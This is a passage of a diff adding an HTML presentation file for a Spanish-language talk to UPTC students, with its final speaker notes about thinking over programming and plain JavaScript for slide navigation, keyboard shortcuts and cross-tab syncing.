+      <blockquote>"Ya no necesitamos ser solo buenos programadores. Necesitamos ser problem solvers. Critical thinkers. [PAUSA] Pensar más. Programar menos."</blockquote>
+      <h4>Gesto</h4>
+      <p>Separarse del laptop. Caminar al centro. Mirar directo. Bajar la voz. Máxima intensidad emocional.</p>
+    `
+  },
+  'slide-29': { title: 'SLIDE 29 · Transición al cierre (39 min)', html: `<p>Slide de respiro. 5 segundos.</p><blockquote>"Una última cosa antes de cerrar."</blockquote>` },
+  'slide-30': { title: 'SLIDE 30 · Elixir comunitario (39-42 min)', html: `<h4>Punto crítico</h4><blockquote><strong>"El criterio que les dieron estos cuatro años"</strong></blockquote><p>— reivindicación final de la carrera. Les devuelve el valor del título.</p>` },
+  'slide-31': { title: 'SLIDE 31 · QR (42-43 min)', html: `<h4>Gesto</h4><p>Dejar el slide 8-10 segundos en pantalla para que escaneen. Mantener contacto visual.</p><blockquote>"Tu primer commit a este mundo está a un git clone de distancia."</blockquote>` },
+  'slide-32': {
+    title: 'SLIDE 32 · Cierre final (43-45 min)',
+    html: `
+      <h4>EL GESTO MÁS IMPORTANTE</h4>
+      <h4>Acciones</h4>
+      <ul>
+        <li>El logo está respirando con animación CSS</li>
+        <li>Los ponentes en silencio 5-8 segundos</li>
+        <li>Un ponente se acerca al micro</li>
+      </ul>
+      <h4>Texto textual</h4>
+      <blockquote><strong>"Porque nunca fue programar."</strong></blockquote>
+      <p>[Pausa de 3 segundos]</p>
+      <blockquote><strong>"Fue pensar."</strong></blockquote>
+    `
+  },
+  'slide-33': { title: 'SLIDE 33 · Gracias y Q&A', html: `<h4>Q&A típico</h4><ul><li>Laptop mínimo: 8GB RAM + SSD</li><li>Setup completo: 15 min con buena conexión</li><li>Calidad vs GPT-5: 85-90% en tareas de código</li></ul><p>Agradecer a profesores, UPTC, organizadores.</p>` }
+};
+
+// ============ LOGIC ============
+let currentSlide = 0;
+const slides = document.querySelectorAll('.slide');
+const totalSlides = slides.length;
+
+function showSlide(n) {
+  if (n < 0) n = 0;
+  if (n >= totalSlides) n = totalSlides - 1;
+  currentSlide = n;
+
+  slides.forEach((s, i) => {
+    s.classList.toggle('active', i === n);
+  });
+
+  document.getElementById('counter').textContent = `${n + 1} / ${totalSlides}`;
+  document.getElementById('progress').style.width = `${((n + 1) / totalSlides) * 100}%`;
+
+  // Update notes
+  const noteKey = slides[n].dataset.notes;
+  const note = SPEAKER_NOTES[noteKey];
+  if (note) {
+    document.getElementById('notesTitle').textContent = note.title;
+    document.getElementById('notesContent').innerHTML = note.html;
+  }
+
+  // Sync across tabs (for presenter mode)
+  try {
+    localStorage.setItem('currentSlide', n);
+  } catch (e) {}
+}
+
+function next() { showSlide(currentSlide + 1); }
+function prev() { showSlide(currentSlide - 1); }
+
+function toggleNotes() {
+  document.getElementById('notesPanel').classList.toggle('open');
+}
+
+function toggleHelp() {
+  document.getElementById('helpOverlay').classList.toggle('open');
+}
+
+function toggleFullscreen() {
+  if (!document.fullscreenElement) {
+    document.documentElement.requestFullscreen();
+  } else {
+    document.exitFullscreen();
+  }
+}
+
+// Keyboard
+document.addEventListener('keydown', (e) => {
+  if (e.target.tagName === 'INPUT') return;
+
+  switch(e.key) {
+    case 'ArrowRight':
+    case ' ':
+    case 'PageDown':
+      next();
+      e.preventDefault();
+      break;
+    case 'ArrowLeft':
+    case 'PageUp':
+      prev();
+      e.preventDefault();
+      break;
+    case 'Home':
+      showSlide(0);
+      break;
+    case 'End':
+      showSlide(totalSlides - 1);
+      break;
+    case 'n':
+    case 'N':
+      toggleNotes();
+      break;
+    case 'f':
+    case 'F':
+      toggleFullscreen();
+      break;
+    case '?':
+    case '/':
+      toggleHelp();
+      break;
+    case 'Escape':
+      document.getElementById('notesPanel').classList.remove('open');
+      document.getElementById('helpOverlay').classList.remove('open');
+      break;
+  }
+});
+
+// Sync across tabs
+window.addEventListener('storage', (e) => {
+  if (e.key === 'currentSlide') {
+    const n = parseInt(e.newValue);
+    if (n !== currentSlide && !isNaN(n)) {
+      showSlide(n);
+    }
+  }
+});
+
+// Init
+showSlide(0);
+</script>
+
+<style>
+@keyframes blink {
+  50% { opacity: 0; }
+}
+</style>
+
+</body>
+</html>
